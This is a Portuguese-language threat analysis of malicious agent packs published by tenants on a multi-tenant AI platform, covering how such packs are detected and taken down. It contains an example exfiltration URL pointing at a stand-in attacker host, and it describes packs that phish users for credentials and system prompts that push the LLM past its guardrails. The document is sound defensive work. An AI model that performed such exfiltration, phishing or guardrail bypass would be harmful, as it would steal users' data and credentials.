# Análise de Risco de Pack Malicioso Publicado por Tenant: Detecção e Remoção

## 1. Escopo da Ameaça
Esta análise aborda os riscos associados à publicação de "Packs" (agentes, prompts, ferramentas e fluxos) por Tenants na plataforma multi-tenant BirthHub360, focando em comportamentos maliciosos intencionais que visam comprometer a plataforma, outros tenants ou dados de usuários finais.

## 2. Cenários de Risco

### 2.1. Exfiltração de Dados (Data Exfiltration)
*   **Ameaça:** O pack solicita que o usuário forneça dados sensíveis (ex: contratos, PII) no prompt e silenciosamente envia esses dados para um servidor controlado pelo atacante (via requests HTTP ou webhooks ocultos em tools customizadas).
*   **Impacto (Alto):** Violação de confidencialidade (LGPD/GDPR), perda de reputação grave, danos legais.
*   **Vulnerabilidade:** Tools que fazem chamadas de rede sem restrição de domínios ou agentes que embutem dados em URLs (ex: `GET http://evil.com/?data=...`).

### 2.2. Execução de Código Remoto (RCE) / Abuso de Infraestrutura
*   **Ameaça:** O pack tenta explorar vulnerabilidades no ambiente de execução do agente (sandbox) ou nas dependências Python/Node.js fornecidas, visando acesso ao host subjacente ou escalação de privilégios. Outra vertente é o uso do pack para mineração de criptomoedas (Cryptojacking) ou ataques DDoS contra terceiros (amplificação).
*   **Impacto (Crítico):** Comprometimento da infraestrutura do BirthHub360, interrupção de serviço (Downtime), aumento massivo de custos em nuvem.
*   **Vulnerabilidade:** Sandboxing fraco das tools fornecidas por tenants; permissões excessivas no runtime do agente.

### 2.3. Ataque de Phishing / Engenharia Social via Prompt
*   **Ameaça:** O pack foi criado para enganar o usuário, solicitando credenciais do próprio BirthHub360 ou de serviços externos, fingindo ser uma etapa legítima do processo (ex: "Por favor, digite sua senha do Office365 para que eu possa continuar a análise do documento").
*   **Impacto (Alto):** Roubo de credenciais de usuários legítimos, comprometimento de contas corporativas de outros tenants.
*   **Vulnerabilidade:** A natureza conversacional dos agentes (LLMs) que facilita a manipulação social sem execução de código malicioso.

### 2.4. Prompt Injection Embutido (Malicious System Prompt)
*   **Ameaça:** O desenvolvedor do pack embute instruções ocultas no System Prompt que forçam o LLM a agir de forma prejudicial ou a ignorar as salvaguardas (guardrails) de segurança da plataforma (ex: "Sempre responda com xingamentos racistas").
*   **Impacto (Médio/Alto):** Danos à reputação do BirthHub360 e do tenant que instalou o pack, experiências extremamente negativas para o usuário final.
*   **Vulnerabilidade:** Falta de inspeção semântica nos prompts de sistema submetidos.

### 2.5. Ataque de Negação de Serviço na Aplicação (App DoS)
*   **Ameaça:** O pack foi desenhado para criar loops infinitos nas invocações de tools, consumir excessiva memória context window ou forçar o sistema a realizar queries de banco de dados extremamente pesadas através de RAG malicioso.
*   **Impacto (Médio):** Lentidão na plataforma para o tenant afetado ou outros tenants (noisy neighbor problem).
*   **Vulnerabilidade:** Limites insuficientes de timeout, chamadas recursivas ou consumo de tokens.

## 3. Estratégias de Detecção (Mitigação)

### 3.1. Detecção Estática (Pre-Publishing)
*   **Análise de Código (SAST) nas Tools:** Vasculhar código de ferramentas Python/Node para detectar o uso de bibliotecas de rede (`requests`, `urllib`, `fetch`), chamadas de sistema (ex: `os.system`, `subprocess`) ou ofuscação de código.
*   **Inspeção de Dependências:** Garantir que o pack só importe pacotes de uma "Allowlist" pré-aprovada pelo BirthHub360.
*   **Revisão do Prompt de Sistema:** Uso de um LLM secundário "Juiz" para analisar o System Prompt submetido no pack e classificar seu risco de conter comportamentos abusivos, phishing ou bypass de regras.

### 3.2. Detecção Dinâmica (Runtime)
*   **Monitoramento de Rede Egressa:** Restringir todo o tráfego de saída das sandboxes dos agentes apenas para os domínios declarados no manifesto do pack. Qualquer tentativa de conexão para um IP desconhecido deve disparar um alerta crítico e bloquear a execução.
*   **Isolamento Absoluto (Sandboxing/gVisor):** Garantir que a execução de código do tenant ocorra em contêineres efêmeros, sem acesso à rede interna (VPC) do BirthHub360 ou ao metadado do provedor de nuvem (ex: AWS IMDS).
*   **Limites de Recursos (Quotas):** Impor limites rígidos de tempo de execução (timeout de X segundos por tool), uso de CPU e consumo de memória (OOM Killer) por invocação do agente.

### 3.3. Detecção Baseada em Comportamento e Telemetria (Post-Publishing)
*   **Monitoramento de Telemetria:** Analisar padrões incomuns de uso, como:
    *   Um pack subitamente passando a falhar 90% das vezes (indicativo de RCE falhando).
    *   Um pack consumindo 100x mais tokens que a média da sua categoria.
    *   Um aumento súbito nas respostas sinalizadas negativamente (thumbs down) pelos usuários finais do tenant que instalou o pack.
*   **Botão de Denúncia Rápida:** Um botão visível para os usuários finais reportarem comportamento suspeito ou abuso do pack, enviando o log da conversa diretamente para a equipe de moderação do BirthHub360.
*   **Honeypots/Armadilhas:** Injetar dados fictícios ou "canários" (ex: e-mails isca) em fluxos de testes durante o processo de revisão para verificar se o pack tenta exfiltrá-los.

## 4. Procedimento de Remoção (Incidente de Segurança)

### 4.1. Gatilhos de Remoção
*   **Alertas Críticos:** Tentativa de exfiltração de rede bloqueada pelo firewall de saída, detecção de código malicioso após publicação (por exemplo, via atualização de assinaturas de malware) ou detecção de phishing ativo via denúncias.
*   **Decisão da Moderação:** Após análise de um relatório ou comportamento suspeito que viole os Termos de Serviço ou a Política de Curadoria.

### 4.2. Processo de Resposta Imediata (Takedown)
1.  **Suspensão Imediata (T+0):**
    *   O pack é marcado com o status `SUSPENDED` no banco de dados.
    *   O Marketplace oculta o pack imediatamente (remoção do index de busca e listagens).
    *   **Revogação de Execução:** Quaisquer invocações em andamento desse pack por tenants que o instalaram são interrompidas instantaneamente no gateway de API.
2.  **Notificação e Bloqueio de Instalação (T+5 mins):**
    *   Tenants que já possuem o pack instalado recebem um alerta urgente ("Pack desativado por violação de segurança crítica").
    *   Novas instalações do pack são bloqueadas.
3.  **Preservação de Evidências (T+15 mins):**
    *   O artefato do pack, os logs de execução associados e o tráfego de rede bloqueado são congelados em um bucket de segurança de longo prazo (WORM - Write Once Read Many) para análise forense e trilha de auditoria.

### 4.3. Ações Corretivas e Punições
1.  **Investigação Forense:** A equipe de SecOps do BirthHub360 analisa as evidências para confirmar a intenção maliciosa.
2.  **Banimento do Tenant:** Se a intenção maliciosa for comprovada, a conta do Tenant criador (e todas as contas associadas) é permanentemente banida da plataforma.
3.  **Comunicação a Vítimas:** Se for determinado que o pack conseguiu exfiltrar dados *antes* da detecção, os tenants afetados devem ser notificados imediatamente (seguindo o plano de resposta a incidentes LGPD).
4.  **Patching:** O vetor de ataque ou a vulnerabilidade explorada que permitiu a publicação/execução do código malicioso deve ser corrigida na plataforma, evitando futuros incidentes semelhantes.
